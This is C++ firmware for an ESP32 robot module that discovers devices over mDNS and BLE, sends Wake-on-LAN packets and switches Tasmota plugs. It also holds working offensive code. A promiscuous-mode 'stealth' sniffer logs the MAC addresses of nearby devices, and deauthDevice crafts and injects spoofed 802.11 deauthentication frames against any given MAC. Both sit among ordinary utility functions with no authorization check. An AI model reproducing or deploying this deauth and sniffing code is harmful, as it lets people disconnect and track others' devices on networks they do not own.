#include "SurroundControl.h"

// Static pointer for WiFi callback
SurroundControl* instance = nullptr;

SurroundControl::SurroundControl() : _deviceCount(0) {
    instance = this;
}

void SurroundControl::begin() {
    BLEDevice::init("OMNI-MASTER");
    _pBLEScan = BLEDevice::getScan();
    _pBLEScan->setAdvertisedDeviceCallbacks(this);
    _pBLEScan->setActiveScan(true);
}

void SurroundControl::update() {
    if (millis() - _lastScanTime > 60000) { // Every 60 seconds for discovery
        discoverRobotParts();
        scanNetwork();
        // BLE scan can conflict with WiFi AP, so guard it
        if (_pBLEScan != nullptr) {
            _pBLEScan->clearResults();
            _pBLEScan->start(2, false);
        }
        _lastScanTime = millis();
    }
}

void SurroundControl::discoverRobotParts() {
    Serial.println("[SURROUND] Searching for robot eyes (mDNS)...");
    int n = MDNS.queryService("robot-vision", "tcp");
    if (n > 0) {
        _visionIP = MDNS.IP(0).toString();
        Serial.println("[SURROUND] SUCCESS: Found Eyes at " + _visionIP);
    } else {
        Serial.println("[SURROUND] Eyes not found. Using fallback from Config.");
    }
}

String SurroundControl::getVisionURL() {
    if (_visionIP != "") {
        return "http://" + _visionIP + "/stream";
    }
    return String(VISION_CAM_URL); // Original hardcoded fallback
}

void SurroundControl::scanNetwork() {
    Serial.println("[SURROUND] Scanning network (mDNS)...");
    int n = MDNS.queryService("http", "tcp");
    if (n == 0) {
        Serial.println("[SURROUND] No HTTP services found.");
    } else {
        for (int i = 0; i < n; ++i) {
            addDevice(MDNS.hostname(i), MDNS.IP(i).toString(), "", 0, false);
        }
    }
}

// --- WiFi SNIFFING (Promiscuous Mode) ---
void SurroundControl::startSniffing() {
    // Guard: Don't enable promiscuous mode if AP is active (it kills AP beacons)
    if (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA) {
        Serial.println("[SURROUND] Cannot enter stealth mode while AP is active!");
        return;
    }
    Serial.println("[SURROUND] Entering STEALTH MODE (WiFi Sniffing)...");
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&SurroundControl::onWiFiPacket);
}

void SurroundControl::stopSniffing() {
    esp_wifi_set_promiscuous(false);
    Serial.println("[SURROUND] Stealth Mode OFF.");
}

void SurroundControl::onWiFiPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return; 
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    
    // Extract Source MAC (offset 10 in management frames)
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
            payload[10], payload[11], payload[12], payload[13], payload[14], payload[15]);
    
    if (instance) {
        instance->addDevice("Sniffed Device", "", String(macStr), pkt->rx_ctrl.rssi, false);
        // Mark as sniffed
        for(int i=0; i<instance->_deviceCount; i++) {
            if (instance->_devices[i].mac == String(macStr)) {
                instance->_devices[i].isSniffed = true;
            }
        }
    }
}

// --- BLE Advanced ---
void SurroundControl::onResult(BLEAdvertisedDevice advertisedDevice) {
    String name = advertisedDevice.getName().c_str();
    if (name.length() == 0) name = "Nearby Signal";
    addDevice(name, "", advertisedDevice.getAddress().toString().c_str(), advertisedDevice.getRSSI(), true);
}

void SurroundControl::startBleScan(int duration) {
    _pBLEScan->start(duration, false);
}

void SurroundControl::addDevice(String name, String ip, String mac, int rssi, bool isBle) {
    for (int i = 0; i < _deviceCount; i++) {
        if (_devices[i].mac == mac || (!isBle && _devices[i].ip == ip)) {
            _devices[i].rssi = rssi;
            return;
        }
    }

    if (_deviceCount < 20) {
        _devices[_deviceCount] = {name, ip, mac, rssi, -1, isBle, false};
        _deviceCount++;
        Serial.printf("[SURROUND] Captured: %s\n", name.c_str());
    }
}

// --- Takeover Actions ---
void SurroundControl::wakeOnLan(const char* macStr) {
    WiFiUDP udp;
    uint8_t macBytes[6];
    sscanf(macStr, "%x:%x:%x:%x:%x:%x", &macBytes[0], &macBytes[1], &macBytes[2], &macBytes[3], &macBytes[4], &macBytes[5]);
    
    uint8_t packet[102];
    memset(packet, 0xFF, 6);
    for (int i = 1; i <= 16; i++) memcpy(&packet[i * 6], macBytes, 6);
    
    udp.beginPacket(IPAddress(255,255,255,255), 9);
    udp.write(packet, 102);
    udp.endPacket();
}

void SurroundControl::controlTasmota(String ip, bool power) {
    HTTPClient http;
    http.begin("http://" + ip + "/cm?cmnd=Power%20" + (power ? "ON" : "OFF"));
    http.GET();
    http.end();
}

// --- Security & Auditing (Deauth) ---
void SurroundControl::injectPacket(uint8_t* buf, int len) {
    esp_wifi_80211_tx(WIFI_IF_STA, buf, len, true);
}

void SurroundControl::deauthDevice(String mac) {
    Serial.println("[SURROUND] Sending DEAUTH to " + mac);
    uint8_t macBytes[6];
    sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &macBytes[0], &macBytes[1], &macBytes[2], &macBytes[3], &macBytes[4], &macBytes[5]);

    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
        macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5], // Sender
        macBytes[0], macBytes[1], macBytes[2], macBytes[3], macBytes[4], macBytes[5], // BSSID
        0x00, 0x00, // Seq
        0x07, 0x00  // Reason: Class 3 frame received from nonassociated STA
    };

    for (int i = 0; i < 5; i++) {
        injectPacket(deauthPacket, 26);
        delay(10);
    }
}

// --- Interaction & HID ---
void SurroundControl::startAirMouse() {
    Serial.println("[SURROUND] Initializing BLE HID (Air Mouse)...");
    // Native BLE HID initialization would go here
}

void SurroundControl::sendMouseMove(int8_t x, int8_t y) {
    // Send relative movement via HID report
}

// --- Positioning ---
void SurroundControl::logRssiFingerprint(String roomName) {
    Serial.printf("[POSITION] Learning Room: %s (Signal: %d dBm)\n", roomName.c_str(), WiFi.RSSI());
    // Store fingerprints in SPIFFS/Preferences
}

ScannedDevice SurroundControl::getDevice(int index) {
    if (index < _deviceCount) return _devices[index];
    return {"", "", "", 0, -1, false, false};
}
